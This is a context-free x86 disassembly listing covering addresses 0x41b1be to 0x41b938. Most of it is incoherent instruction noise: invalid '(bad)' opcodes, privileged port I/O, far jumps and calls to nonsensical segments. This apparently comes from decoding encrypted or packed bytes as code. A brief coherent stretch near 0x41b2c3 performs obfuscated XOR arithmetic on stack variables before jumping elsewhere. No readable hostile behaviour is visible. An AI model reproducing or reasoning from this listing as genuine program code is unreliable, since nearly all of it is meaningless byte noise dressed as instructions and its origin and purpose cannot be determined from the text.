  41b1be:	jmp    0x497:0xee86d238
  41b1c5:	pop    esi
  41b1c6:	es xchg edx,eax
  41b1c8:	push   edi
  41b1c9:	xlat   BYTE PTR ds:[ebx]
  41b1ca:	jecxz  0x41b20e
  41b1cc:	pop    ecx
  41b1cd:	push   edi
  41b1ce:	xor    al,0xce
  41b1d0:	sbb    DWORD PTR [eax],edx
  41b1d2:	iret   
  41b1d3:	mov    ebp,0xc8a7501d
  41b1d8:	mov    esp,0x25217081
  41b1dd:	or     ah,BYTE PTR ds:0x1adbf4e0
  41b1e3:	mov    al,0x97
  41b1e5:	xor    al,0x3f
  41b1e7:	rcr    BYTE PTR [eax+0x4d],cl
  41b1ea:	mov    ebx,DWORD PTR [ecx]
  41b1ec:	xchg   BYTE PTR ds:0x51fec17a,al
  41b1f2:	(bad)  
  41b1f3:	jmp    0x41b22b
  41b1f5:	inc    edi
  41b1f6:	mov    ch,0x9e
  41b1f8:	jnp    0x41b1f6
  41b1fa:	push   0xffffffa7
  41b1fc:	push   edi
  41b1fd:	pusha  
  41b1fe:	mov    eax,0x81adb7d0
  41b203:	into   
  41b204:	inc    eax
  41b205:	mov    ds:0x832dd3ff,al
  41b20a:	pop    edx
  41b20b:	std    
  41b20c:	sbb    bl,BYTE PTR [ecx-0x30]
  41b20f:	mov    ebp,0x3f6eeebc
  41b214:	mov    ecx,0x214d66e6
  41b219:	cwde   
  41b21a:	jns    0x41b1fd
  41b21c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b21d:	rcr    BYTE PTR [edi-0x4eeb6b93],0x80
  41b224:	push   edi
  41b225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b226:	sbb    bl,BYTE PTR [ebp+0x144d87a8]
  41b22c:	and    al,0x3
  41b22e:	jl     0x41b27c
  41b230:	je     0x41b274
  41b232:	pop    ebx
  41b233:	adc    DWORD PTR [eax-0x401e9686],esi
  41b239:	cmc    
  41b23a:	sub    dl,BYTE PTR [ecx+0x7dc75cc]
  41b240:	xor    DWORD PTR [ebx],ebx
  41b242:	test   al,0x58
  41b244:	(bad)  
  41b245:	mov    ch,BYTE PTR [eax-0x72]
  41b248:	xchg   edi,eax
  41b249:	sbb    BYTE PTR [edx],bh
  41b24b:	cmc    
  41b24c:	sbb    ecx,edi
  41b24e:	push   ebp
  41b24f:	pop    ecx
  41b250:	mov    eax,ds:0x8c95ac62
  41b255:	mov    BYTE PTR [esi],dh
  41b257:	int3   
  41b258:	es push esp
  41b25a:	lods   al,BYTE PTR ds:[esi]
  41b25b:	loope  0x41b22b
  41b25d:	ds cmp al,0x28
  41b260:	stos   DWORD PTR es:[edi],eax
  41b261:	mov    WORD PTR [edx+0x27],fs
  41b264:	outs   dx,DWORD PTR ds:[esi]
  41b265:	loopne 0x41b252
  41b267:	test   eax,0x8fa08a4d
  41b26c:	sbb    ebx,ebx
  41b26e:	(bad)  
  41b26f:	pop    esi
  41b270:	xlat   BYTE PTR ds:[bx]
  41b272:	test   eax,0x3a580373
  41b277:	pop    edi
  41b278:	jmp    0xf6b7:0xa67f9dee
  41b27f:	jno    0x41b254
  41b281:	and    edx,eax
  41b283:	sub    eax,0xa88f6ce8
  41b288:	aaa    
  41b289:	mov    ch,BYTE PTR [ecx]
  41b28b:	leave  
  41b28c:	sar    DWORD PTR [esi+0xfd60b52],1
  41b292:	call   0xf0d1:0xc246790e
  41b299:	(bad)  
  41b29a:	jecxz  0x41b262
  41b29c:	adc    DWORD PTR [edi+0x7498c368],eax
  41b2a2:	dec    esp
  41b2a3:	dec    ebp
  41b2a4:	inc    ebp
  41b2a5:	push   eax
  41b2a6:	and    eax,edx
  41b2a8:	pop    esp
  41b2a9:	inc    ecx
  41b2aa:	jg     0x41b308
  41b2ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2ad:	cli    
  41b2ae:	jp     0x41b2fd
  41b2b0:	xchg   esi,eax
  41b2b1:	xchg   ecx,eax
  41b2b2:	jae    0x41b319
  41b2b4:	pop    es
  41b2b5:	pop    ebp
  41b2b6:	aas    
  41b2b7:	cdq    
  41b2b8:	iret   
  41b2b9:	push   edx
  41b2ba:	and    al,0x24
  41b2bc:	lahf   
  41b2bd:	xchg   esi,eax
  41b2be:	dec    ebx
  41b2bf:	mov    BYTE PTR [ebx+esi*1-0x2d],ch
  41b2c3:	mov    DWORD PTR [ebp-0x50],edx
  41b2c6:	mov    edx,DWORD PTR [ebp+0x8]
  41b2c9:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b2cc:	add    edx,edi
  41b2ce:	and    edx,ebx
  41b2d0:	mov    DWORD PTR [ebp-0x4c],edx
  41b2d3:	mov    edx,DWORD PTR [ebp+0x8]
  41b2d6:	mov    ebx,DWORD PTR [ebp-0x48]
  41b2d9:	lea    edx,[ebx+edx*1+0x241fcde]
  41b2e0:	mov    DWORD PTR [ebp-0x48],edx
  41b2e3:	mov    edx,DWORD PTR [ebp+0x8]
  41b2e6:	mov    ebx,0xfa5e1521
  41b2eb:	sub    ebx,edx
  41b2ed:	add    ebx,DWORD PTR [ebp-0x44]
  41b2f0:	mov    DWORD PTR [ebp-0x44],ebx
  41b2f3:	mov    edx,DWORD PTR [ebp+0x8]
  41b2f6:	xor    edx,eax
  41b2f8:	add    edx,esi
  41b2fa:	jne    0x418f20
  41b300:	jmp    0x41d6f0
  41b305:	mov    edx,DWORD PTR [ebp-0x14]
  41b308:	mov    DWORD PTR [ebp+0x8],edx
  41b30b:	jmp    0x41d6e3
  41b310:	mov    edx,DWORD PTR [ebp+0x8]
  41b313:	mov    ebx,DWORD PTR [ebp-0x8]
  41b316:	xor    edx,eax
  41b318:	xor    ebx,eax
  41b31a:	sub    edx,ebx
  41b31c:	sub    edx,esi
  41b31e:	xor    edx,eax
  41b320:	mov    DWORD PTR [ebp+0x8],edx
  41b323:	mov    edx,DWORD PTR [ebp+0x8]
  41b326:	mov    ebx,DWORD PTR [ebp-0x58]
  41b329:	jmp    0x41d68c
  41b32e:	popa   
  41b32f:	cmc    
  41b330:	cwde   
  41b331:	mov    eax,0xd7017b98
  41b336:	pop    ecx
  41b337:	popa   
  41b338:	mov    edx,DWORD PTR [eax]
  41b33a:	push   ds
  41b33b:	(bad)  
  41b33c:	retf   
  41b33d:	push   ecx
  41b33e:	xlat   BYTE PTR ds:[ebx]
  41b33f:	(bad)  
  41b340:	jge    0x41b3bc
  41b342:	xor    BYTE PTR [edi+0x7a],bl
  41b345:	jp     0x41b3be
  41b347:	adc    BYTE PTR [eax-0x67],ah
  41b34a:	int    0xd4
  41b34c:	(bad)  
  41b34d:	shl    BYTE PTR [ecx+0x1f6ec76b],1
  41b353:	pusha  
  41b354:	outs   dx,BYTE PTR ds:[esi]
  41b355:	into   
  41b356:	cmp    ecx,DWORD PTR [esi-0x6a680016]
  41b35c:	push   esi
  41b35d:	cmc    
  41b35e:	imul   eax,DWORD PTR [ebx],0x2b
  41b361:	pop    ebx
  41b362:	adc    BYTE PTR [esi+ebp*2-0x61ca4dcc],al
  41b369:	hlt    
  41b36a:	add    BYTE PTR [esi],dl
  41b36c:	inc    ecx
  41b36d:	rcr    BYTE PTR [edx+0xe3d29e0],cl
  41b373:	jns    0x41b307
  41b375:	mov    edx,0xcec4f4f4
  41b37a:	arpl   WORD PTR [eax+0x51cf0319],si
  41b380:	mov    cs,ecx
  41b382:	push   ebp
  41b383:	xor    DWORD PTR [ecx+0x25],esp
  41b386:	gs and al,0x92
  41b389:	shl    BYTE PTR [ebp+0x86a56b],cl
  41b38f:	sahf   
  41b390:	dec    ebp
  41b391:	dec    eax
  41b392:	rcr    ah,cl
  41b394:	mov    cl,0x42
  41b396:	dec    ecx
  41b397:	jnp    0x41b342
  41b399:	xchg   edi,eax
  41b39a:	push   edi
  41b39b:	repnz bound ecx,QWORD PTR [esp+edi*1-0x31]
  41b3a0:	inc    ecx
  41b3a1:	dec    ebp
  41b3a2:	mov    dl,BYTE PTR [esi+0x58fd8be8]
  41b3a8:	mov    al,ds:0xdb4d0bd1
  41b3ad:	sbb    eax,0xacb96a4c
  41b3b2:	shl    DWORD PTR [esi-0x36043bde],cl
  41b3b8:	xor    BYTE PTR [ebx],dl
  41b3ba:	sti    
  41b3bb:	push   esi
  41b3bc:	int    0x32
  41b3be:	out    dx,eax
  41b3bf:	add    dh,BYTE PTR [ecx+0x63a51474]
  41b3c5:	xor    al,0x41
  41b3c7:	pop    esp
  41b3c8:	icebp  
  41b3c9:	xlat   BYTE PTR ds:[ebx]
  41b3ca:	scas   eax,DWORD PTR es:[edi]
  41b3cb:	jae    0x41b3dd
  41b3cd:	sub    DWORD PTR [ebx],eax
  41b3cf:	cmp    DWORD PTR [ebp-0x5f5ee064],edi
  41b3d5:	xchg   esi,eax
  41b3d6:	shl    ecx,cl
  41b3d8:	inc    ecx
  41b3d9:	call   0x534599e1
  41b3de:	ret    0xe991
  41b3e1:	lds    edx,FWORD PTR ds:0x25cdfd34
  41b3e7:	std    
  41b3e8:	pop    ss
  41b3e9:	sbb    eax,0xd831e81d
  41b3ee:	test   eax,0x84811bcb
  41b3f3:	out    0xec,eax
  41b3f5:	leave  
  41b3f6:	out    dx,eax
  41b3f7:	idiv   BYTE PTR [ecx-0x345ed907]
  41b3fd:	pushw  ss
  41b3ff:	jge    0x41b3d8
  41b401:	daa    
  41b402:	fwait
  41b403:	aad    0xbb
  41b405:	dec    esp
  41b406:	neg    DWORD PTR [edx-0x4c]
  41b409:	retf   0x5214
  41b40c:	(bad)  
  41b40d:	mov    WORD PTR [eax-0x7],?
  41b410:	daa    
  41b411:	loopne 0x41b410
  41b413:	mov    ds:0xa7b37126,eax
  41b418:	cmp    dh,BYTE PTR [esp+ebx*4]
  41b41b:	mov    edx,0xc5f6312f
  41b420:	xchg   ebp,eax
  41b421:	dec    eax
  41b422:	stos   BYTE PTR es:[edi],al
  41b423:	mov    ds:0xe463dfe5,al
  41b428:	jnp    0x41b40c
  41b42a:	mov    ds,WORD PTR [ebx]
  41b42c:	psadbw mm4,QWORD PTR [edi]
  41b42f:	retf   
  41b430:	xchg   ecx,eax
  41b431:	add    BYTE PTR [ebp+0x60fb24ba],ch
  41b437:	push   ecx
  41b438:	pop    esi
  41b439:	mov    BYTE PTR [esi+ecx*2],0x3c
  41b43d:	test   BYTE PTR [esi-0x76],ch
  41b440:	js     0x41b46d
  41b442:	xchg   edi,eax
  41b443:	test   eax,0xbd2e35dd
  41b448:	pop    esi
  41b449:	sbb    al,0x25
  41b44b:	mov    esi,0x2a2b7718
  41b450:	or     esp,DWORD PTR [edi]
  41b452:	xor    eax,0x82a38fd4
  41b457:	lods   al,BYTE PTR ds:[esi]
  41b458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b459:	loop   0x41b4a6
  41b45b:	imul   esi,DWORD PTR [ebx],0x7e7364e9
  41b461:	lock fisubr WORD PTR [bx+si-0x64cd]
  41b467:	out    dx,al
  41b468:	dec    edx
  41b469:	in     al,0x52
  41b46b:	aam    0xfc
  41b46d:	rcl    DWORD PTR [ebx-0x33ea7a04],0x4f
  41b474:	ret    0x10fa
  41b477:	pop    ss
  41b478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b479:	pop    ebp
  41b47a:	int3   
  41b47b:	xchg   esi,eax
  41b47c:	adc    cl,al
  41b47e:	ror    BYTE PTR [esi+edx*1],0xc9
  41b482:	pop    ebx
  41b483:	ja     0x41b408
  41b485:	fldenv [edx+0x1e]
  41b488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b489:	mov    eax,0x228d2e3c
  41b48e:	call   0xf233:0x1cad5fa8
  41b495:	enter  0x8b66,0x4a
  41b499:	nop
  41b49a:	stos   DWORD PTR es:[edi],eax
  41b49b:	inc    ebp
  41b49c:	popf   
  41b49d:	cwde   
  41b49e:	mov    ds:0xe1454fdd,al
  41b4a3:	cmp    BYTE PTR [edx+0x1],bl
  41b4a6:	inc    edx
  41b4a7:	or     al,0x6b
  41b4a9:	(bad)  
  41b4aa:	xchg   edi,eax
  41b4ab:	pop    ss
  41b4ac:	sti    
  41b4ad:	sub    al,0xc8
  41b4af:	aaa    
  41b4b0:	test   al,0xd6
  41b4b2:	mov    esi,0x40ead55
  41b4b7:	je     0x41b46a
  41b4b9:	js     0x41b519
  41b4bb:	test   BYTE PTR [ebp-0x79],0xc6
  41b4bf:	xchg   ebx,eax
  41b4c0:	inc    eax
  41b4c1:	in     al,0x83
  41b4c3:	xchg   esp,eax
  41b4c4:	jl     0x41b475
  41b4c6:	sbb    DWORD PTR [edx-0x5d],edx
  41b4c9:	mov    al,ds:0x93516420
  41b4ce:	add    ebx,DWORD PTR [eax+0x2b50f55b]
  41b4d4:	loope  0x41b516
  41b4d6:	jne    0x41b48a
  41b4d8:	and    ecx,edi
  41b4da:	mov    dh,0x1e
  41b4dc:	mov    eax,0x9aaceda0
  41b4e1:	mov    ah,BYTE PTR [esi-0x327d7cbf]
  41b4e7:	ds (bad) 
  41b4e9:	mov    BYTE PTR [ecx+0x3017f436],cl
  41b4ef:	lods   eax,DWORD PTR ds:[esi]
  41b4f0:	push   ebp
  41b4f1:	cmc    
  41b4f2:	push   esi
  41b4f3:	int    0x37
  41b4f5:	shl    DWORD PTR [edx+0x7263f1b6],1
  41b4fb:	pop    esi
  41b4fd:	hlt    
  41b4fe:	stos   DWORD PTR es:[edi],eax
  41b4ff:	div    DWORD PTR ds:0x6fe98047
  41b505:	mov    eax,DWORD PTR [esi-0x2ac26d8f]
  41b50b:	add    DWORD PTR [edx-0x7110d56a],esi
  41b511:	iret   
  41b512:	sub    edx,DWORD PTR [ebx+edx*1-0x65]
  41b516:	or     ebp,DWORD PTR [esi+0x69013f69]
  41b51c:	cmc    
  41b51d:	push   ss
  41b51e:	shr    BYTE PTR ds:0x6d38bae5,cl
  41b524:	cmp    eax,0x7cc11117
  41b529:	imul   BYTE PTR [edx-0x55ebd0c5]
  41b52f:	sub    DWORD PTR [ecx],eax
  41b531:	adc    ecx,DWORD PTR [edx]
  41b533:	adc    DWORD PTR [ecx+edx*1+0x8],eax
  41b537:	loopne 0x41b52b
  41b539:	scas   eax,DWORD PTR es:[edi]
  41b53a:	cmp    bh,BYTE PTR [edi+0x6e]
  41b53d:	bound  eax,QWORD PTR [ebp-0x2fcb4abd]
  41b543:	clc    
  41b544:	xor    cl,BYTE PTR [ecx+0x5d]
  41b547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b548:	sbb    DWORD PTR [esi],0x30
  41b54b:	cmpps  xmm6,xmm4,0x18
  41b54f:	loopne 0x41b597
  41b551:	outs   dx,DWORD PTR ds:[esi]
  41b552:	test   eax,0xde619103
  41b557:	adc    BYTE PTR [edx-0xfaf85c3],dl
  41b55d:	adc    eax,0x28dc4b67
  41b562:	cmp    edx,DWORD PTR [ebx+0x7c]
  41b565:	adc    ecx,0x1bd727ba
  41b56b:	mov    edx,DWORD PTR [ebp-0x3fc3b5c1]
  41b571:	or     cl,bl
  41b573:	mov    ch,0x94
  41b575:	call   0xf468ab35
  41b57a:	sar    cl,cl
  41b57c:	dec    eax
  41b57d:	adc    al,0x25
  41b57f:	das    
  41b580:	mov    DWORD PTR [ecx+ebx*8+0x4d],esi
  41b584:	sbb    dl,BYTE PTR [ecx+0x6f]
  41b587:	dec    esi
  41b588:	and    edi,DWORD PTR [edx+0x7e5e1db4]
  41b58e:	ret    0x492e
  41b591:	retf   
  41b592:	xchg   esi,eax
  41b593:	jb     0x41b560
  41b595:	and    al,0xf9
  41b597:	cwde   
  41b598:	mov    dh,0x47
  41b59a:	inc    ebx
  41b59b:	ds mov dh,0xf9
  41b59e:	(bad)  
  41b59f:	(bad)  
  41b5a1:	xor    DWORD PTR [edx],0x673cce2
  41b5a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5a8:	rol    BYTE PTR [edx+0x1d62434c],cl
  41b5ae:	fst    QWORD PTR [ebx-0x1b]
  41b5b1:	cmp    al,ch
  41b5b3:	aaa    
  41b5b4:	leave  
  41b5b5:	outs   dx,DWORD PTR ds:[esi]
  41b5b6:	popa   
  41b5b7:	test   eax,0xea8f7bae
  41b5bc:	adc    DWORD PTR [edx-0x7e25771f],ebx
  41b5c2:	call   0x1a4c6d19
  41b5c7:	aam    0xd4
  41b5c9:	(bad)  
  41b5ca:	stc    
  41b5cb:	loop   0x41b641
  41b5cd:	mov    al,0xa5
  41b5cf:	mov    eax,ds:0x70b5c9bc
  41b5d4:	adc    eax,0x2bf12ce2
  41b5d9:	pop    ds
  41b5da:	sub    DWORD PTR [esi],ebp
  41b5dc:	addr16 pop esi
  41b5de:	test   esi,esp
  41b5e0:	ret    0x3b33
  41b5e3:	cmp    DWORD PTR [edx],edx
  41b5e5:	dec    ebx
  41b5e6:	arpl   WORD PTR [edx-0x10fb72ca],cx
  41b5ec:	imul   edi,DWORD PTR [ecx-0xf],0x9
  41b5f0:	loop   0x41b5a5
  41b5f2:	adc    eax,0x239e7eb3
  41b5f7:	popa   
  41b5f8:	ins    DWORD PTR es:[edi],dx
  41b5f9:	or     DWORD PTR [ecx],eax
  41b5fb:	cmp    dl,al
  41b5fd:	adc    bl,BYTE PTR [edi]
  41b5ff:	mov    dl,0xfe
  41b601:	mov    ebp,0x90cfd24c
  41b606:	ret    0x1529
  41b609:	or     BYTE PTR [ebp-0x42],ch
  41b60c:	adc    DWORD PTR [edi+0x3d],edx
  41b60f:	(bad)
  41b612:	cmp    ah,ah
  41b614:	xor    al,0x30
  41b616:	mov    esi,0x3a00336a
  41b61b:	jg     0x41b616
  41b61d:	sti    
  41b61e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b61f:	test   eax,0x431251d1
  41b624:	cmc    
  41b625:	mov    al,ds:0x1d173d79
  41b62a:	(bad)  
  41b62b:	(bad)  
  41b62d:	jg     0x41b674
  41b62f:	es jg  0x41b631
  41b632:	hlt    
  41b633:	adc    ch,BYTE PTR [ecx]
  41b635:	push   ebx
  41b636:	mov    ch,0xe2
  41b638:	mov    eax,0x5fa6c3b4
  41b63d:	icebp  
  41b63e:	cwde   
  41b63f:	add    al,0x86
  41b641:	inc    eax
  41b643:	stc    
  41b644:	rcl    BYTE PTR [ecx+0x9baea9b],0xbf
  41b64b:	fst    QWORD PTR [eax-0x225eb271]
  41b651:	cdq    
  41b652:	xchg   edi,eax
  41b653:	pop    eax
  41b654:	leave  
  41b655:	inc    bl
  41b657:	lahf   
  41b658:	int3   
  41b659:	xor    eax,0xbea4cd3b
  41b65e:	dec    eax
  41b65f:	push   edi
  41b660:	xchg   ebp,eax
  41b661:	lods   eax,DWORD PTR ds:[esi]
  41b662:	aad    0x5
  41b664:	loopne 0x41b5f5
  41b666:	inc    esp
  41b667:	inc    ebx
  41b668:	add    al,0x59
  41b66a:	fs push 0xd7ad76d7
  41b670:	pop    eax
  41b671:	sbb    al,0xe1
  41b673:	push   ecx
  41b674:	shl    BYTE PTR [edx+0x7fdbdc8a],cl
  41b67a:	fnstenv [edx-0x78bcffb0]
  41b680:	pop    ecx
  41b681:	test   BYTE PTR [esi],0xe0
  41b684:	in     al,dx
  41b685:	test   edx,esi
  41b687:	adc    bh,BYTE PTR [eax]
  41b689:	and    eax,0xe0d05204
  41b68e:	and    al,0xf4
  41b690:	int    0xee
  41b692:	push   ds
  41b693:	test   DWORD PTR [eax+eax*4-0x366ed9ac],ebx
  41b69a:	mov    WORD PTR [ecx-0x5f24318f],ss
  41b6a0:	mov    esp,0xe3e19ad1
  41b6a5:	and    eax,0xa50b0fc3
  41b6aa:	inc    edx
  41b6ab:	cmc    
  41b6ac:	test   dh,dh
  41b6ae:	repz mov edi,0xec54749
  41b6b4:	loop   0x41b711
  41b6b6:	push   0x2b4c15e6
  41b6bb:	mov    edx,0x47cffaa0
  41b6c0:	imul   esi,DWORD PTR [eax-0x5e],0x3f
  41b6c4:	jmp    0x41b6de
  41b6c6:	add    dl,bl
  41b6c8:	xor    eax,DWORD PTR [esi+0x4b6c0ea8]
  41b6ce:	push   0x8d8b3a4b
  41b6d3:	push   ss
  41b6d4:	xlat   BYTE PTR ds:[ebx]
  41b6d5:	retf   
  41b6d6:	(bad)  
  41b6d7:	xchg   ecx,eax
  41b6d8:	fwait
  41b6d9:	mov    esp,0xf9d7037f
  41b6de:	dec    ebx
  41b6df:	pop    ss
  41b6e0:	pop    edi
  41b6e1:	retf   0x890e
  41b6e4:	xchg   esp,eax
  41b6e5:	and    esp,esp
  41b6e7:	xchg   esp,eax
  41b6e8:	adc    eax,0x3f3b2897
  41b6ed:	imul   eax,DWORD PTR [edi],0xc354c51c
  41b6f3:	mov    edx,0x61f6c7fb
  41b6f8:	pop    ss
  41b6f9:	jl     0x41b717
  41b6fb:	or     bl,BYTE PTR [ebx+0x1ef17ff8]
  41b701:	xchg   edi,eax
  41b702:	jle    0x41b719
  41b704:	call   0xda21:0x50ca135a
  41b70b:	sbb    dh,BYTE PTR [eax+0x79]
  41b70e:	cdq    
  41b70f:	or     DWORD PTR [ecx],0xffffffa2
  41b712:	xor    cl,al
  41b714:	push   ebx
  41b715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b716:	out    0x24,eax
  41b718:	mov    WORD PTR [ecx+0x37343b64],es
  41b71e:	out    0x3b,al
  41b720:	dec    edx
  41b721:	fnstenv [edx+0x5d92f430]
  41b727:	xchg   esi,eax
  41b728:	or     BYTE PTR ds:0x31c87362,bl
  41b72e:	dec    edi
  41b72f:	lea    ebp,[ebx+0x7a8fe6dd]
  41b735:	retf   
  41b736:	inc    BYTE PTR [ecx-0x31]
  41b739:	ins    DWORD PTR es:[edi],dx
  41b73a:	push   es
  41b73b:	hlt    
  41b73c:	pop    ecx
  41b73d:	std    
  41b73e:	mov    bl,0xc9
  41b740:	rcr    BYTE PTR [eax-0x29f0b906],0xbc
  41b747:	xchg   BYTE PTR [edi-0x46],bl
  41b74a:	jo     0x41b746
  41b74c:	mov    edx,0xd525872d
  41b751:	push   ecx
  41b752:	lods   eax,DWORD PTR ds:[esi]
  41b753:	icebp  
  41b754:	(bad)  
  41b756:	jle    0x41b728
  41b758:	or     DWORD PTR [edx-0x6d],ebp
  41b75b:	js     0x41b718
  41b75d:	and    BYTE PTR [esi],ch
  41b75f:	mov    esp,0x95c8ac3f
  41b764:	lods   al,BYTE PTR ds:[esi]
  41b765:	xor    al,0xc9
  41b767:	dec    ebp
  41b768:	pop    ebx
  41b769:	ret    
  41b76a:	cmovle edi,DWORD PTR [ecx]
  41b76d:	ins    BYTE PTR es:[edi],dx
  41b76e:	stos   BYTE PTR es:[edi],al
  41b76f:	xchg   ecx,eax
  41b770:	xchg   ecx,eax
  41b771:	fs in  al,dx
  41b773:	ins    BYTE PTR es:[edi],dx
  41b774:	retf   
  41b775:	and    cl,bh
  41b777:	cdq    
  41b778:	inc    ecx
  41b779:	mov    edi,DWORD PTR [edx+0x1f]
  41b77c:	mov    WORD PTR [ebx],ss
  41b77e:	cmp    ebx,DWORD PTR [ebx+0x3f]
  41b781:	ins    BYTE PTR es:[edi],dx
  41b782:	in     al,0x4d
  41b784:	and    eax,DWORD PTR [ecx-0xad46ee7]
  41b78a:	jno    0x41b79d
  41b78c:	adc    ch,BYTE PTR [ecx-0x5dd61b21]
  41b792:	je     0x41b7a6
  41b794:	addr16 push esp
  41b796:	or     al,0x15
  41b798:	push   cs
  41b799:	jp     0x41b72b
  41b79b:	ss sti 
  41b79d:	jge    0x41b7bd
  41b79f:	loope  0x41b75f
  41b7a1:	cmp    al,0x78
  41b7a3:	shl    cl,1
  41b7a5:	fcom   st(7)
  41b7a7:	lock pop esi
  41b7a9:	sbb    BYTE PTR [edx+0x33],dl
  41b7ac:	xchg   edi,eax
  41b7ad:	pop    esp
  41b7ae:	cmp    ecx,DWORD PTR [ecx+0x3e]
  41b7b1:	jge    0x41b789
  41b7b3:	sub    al,0x5d
  41b7b5:	sbb    BYTE PTR [esi-0x77],bh
  41b7b8:	push   esp
  41b7b9:	sub    DWORD PTR [ebp+edx*1+0x12],0x15eb82d7
  41b7c1:	mov    bl,0xc0
  41b7c3:	adc    BYTE PTR [ebx+0x5024c0ad],al
  41b7c9:	jmp    0xb7c4:0x1efa413f
  41b7d0:	cs mov ebp,0xa19b0ce3
  41b7d6:	sbb    eax,0x8774408
  41b7db:	fdiv   DWORD PTR [esi+0x39]
  41b7de:	retf   0x48cf
  41b7e1:	loopne 0x41b837
  41b7e3:	adc    al,0xe3
  41b7e5:	mov    ah,0xfd
  41b7e7:	inc    edx
  41b7e8:	sub    eax,0x54ed7705
  41b7ed:	mov    ebp,0x3f3f8e3a
  41b7f2:	jge    0x41b814
  41b7f4:	popa   
  41b7f5:	jo     0x41b7b5
  41b7f7:	sub    dl,BYTE PTR [ebx+0x78]
  41b7fa:	fs loop 0x41b7d6
  41b7fd:	adc    BYTE PTR [ebx+0x45],ch
  41b800:	and    ebx,DWORD PTR [eax]
  41b802:	xor    al,0xdf
  41b804:	and    BYTE PTR [ebp+0x9],bh
  41b807:	outs   dx,BYTE PTR ds:[esi]
  41b808:	jg     0x41b7be
  41b80a:	cmp    DWORD PTR es:[edi-0x65],esp
  41b80e:	gs icebp 
  41b810:	jg     0x41b873
  41b812:	fidivr WORD PTR [eax]
  41b814:	push   ds
  41b815:	cmp    al,0x22
  41b817:	call   0x595:0x1b29d15a
  41b81e:	or     eax,0x744f20cd
  41b823:	xor    eax,0xd55980cc
  41b828:	div    ah
  41b82a:	sub    esi,eax
  41b82c:	stos   BYTE PTR es:[edi],al
  41b82d:	and    DWORD PTR [ecx],ebx
  41b82f:	daa    
  41b830:	repz cmp edx,DWORD PTR [ebx-0x1d8dc6b]
  41b837:	or     al,0xc9
  41b839:	and    al,0x76
  41b83b:	jne    0x41b806
  41b83d:	mov    BYTE PTR [ebx-0x61],bh
  41b840:	scas   eax,DWORD PTR es:[edi]
  41b841:	fsub   QWORD PTR [edi-0x1c9fbe16]
  41b847:	pop    edx
  41b848:	stc    
  41b849:	xchg   ebp,eax
  41b84a:	mov    ds:0x705bff88,al
  41b84f:	data16 jl 0x41b84e
  41b852:	dec    ebp
  41b853:	sbb    BYTE PTR [ebx-0x44c61f47],bl
  41b859:	sar    BYTE PTR [edx+edx*4-0x114700b],1
  41b860:	nop
  41b861:	jnp    0x41b8d0
  41b863:	mov    al,0x10
  41b865:	lahf   
  41b866:	adc    al,0x49
  41b868:	add    bl,BYTE PTR [eax]
  41b86a:	push   esp
  41b86b:	push   ebx
  41b86c:	loopne 0x41b828
  41b86e:	dec    eax
  41b86f:	and    eax,0x53c192e4
  41b874:	int3   
  41b875:	cdq    
  41b876:	jb     0x41b7fb
  41b878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b879:	test   eax,0x2869c0a8
  41b87e:	sub    edx,edx
  41b880:	or     al,0xa6
  41b882:	retf   0xa52b
  41b885:	mov    DWORD PTR [ecx],ebx
  41b887:	repz cmp cl,BYTE PTR [bx+di-0x3e]
  41b88c:	jl     0x41b8e6
  41b88e:	or     DWORD PTR [edx],eax
  41b890:	ror    DWORD PTR [edi+0x36],cl
  41b893:	adc    al,0x2e
  41b895:	jns    0x41b822
  41b897:	push   0xffffffcb
  41b899:	pushf  
  41b89a:	icebp  
  41b89b:	addr16 push edi
  41b89d:	sub    DWORD PTR [edx+0x391c8b07],0x5
  41b8a4:	in     al,0x64
  41b8a6:	out    dx,al
  41b8a7:	inc    eax
  41b8a8:	xchg   DWORD PTR [edi-0x566d1422],eax
  41b8ae:	test   BYTE PTR [ebx],ah
  41b8b0:	xchg   DWORD PTR [ecx+0xa],edi
  41b8b3:	ret    
  41b8b4:	jle    0x41b8cd
  41b8b6:	add    al,0x16
  41b8b8:	pushf  
  41b8b9:	ss inc ecx
  41b8bb:	dec    eax
  41b8bc:	rcl    DWORD PTR [ebp+eiz*1-0x7e],1
  41b8c0:	adc    eax,0x6f3a4a4b
  41b8c5:	inc    ebx
  41b8c6:	dec    eax
  41b8c7:	loop   0x41b872
  41b8c9:	inc    eax
  41b8ca:	call   0xaa580d5e
  41b8cf:	loopne 0x41b8b4
  41b8d1:	loope  0x41b8e2
  41b8d3:	lea    ebx,[eax-0x292d4d45]
  41b8d9:	rol    dl,1
  41b8db:	adc    BYTE PTR [edi+eax*1],ah
  41b8de:	adc    ebp,DWORD PTR [ebx-0x3e]
  41b8e1:	xor    eax,0x8c5781b
  41b8e6:	lods   al,BYTE PTR ds:[esi]
  41b8e7:	in     al,0xf3
  41b8e9:	inc    ebx
  41b8ea:	aas    
  41b8eb:	xor    edx,DWORD PTR [ebx]
  41b8ed:	jns    0x41b918
  41b8ef:	jmp    0x5cf2:0x2a3bf81c
  41b8f6:	mov    dl,0x30
  41b8f8:	and    BYTE PTR [ebx],al
  41b8fa:	or     dh,0x26
  41b8fd:	repnz inc ebx
  41b8ff:	mov    ss,WORD PTR [ecx]
  41b901:	jo     0x41b909
  41b903:	cmp    al,BYTE PTR [edi+ebp*1+0x76]
  41b907:	test   DWORD PTR [edx],0xbdddf179
  41b90d:	sbb    BYTE PTR [edi-0x2e5dac9],al
  41b913:	loope  0x41b8cf
  41b915:	xor    DWORD PTR [edi+0x4a],ebx
  41b918:	pop    esi
  41b919:	aam    0xa3
  41b91b:	ds mov ebx,0xe3680549
  41b921:	adc    esp,eax
  41b923:	adc    al,0x45
  41b925:	xor    BYTE PTR [ecx],0x39
  41b928:	dec    ebp
  41b929:	sbb    eax,0x92f8d940
  41b92e:	xor    bh,bh
  41b930:	cmp    eax,DWORD PTR [eax-0x2439b18b]
  41b936:	ja     0x41b937
  41b938:	loop   0x41b8c4
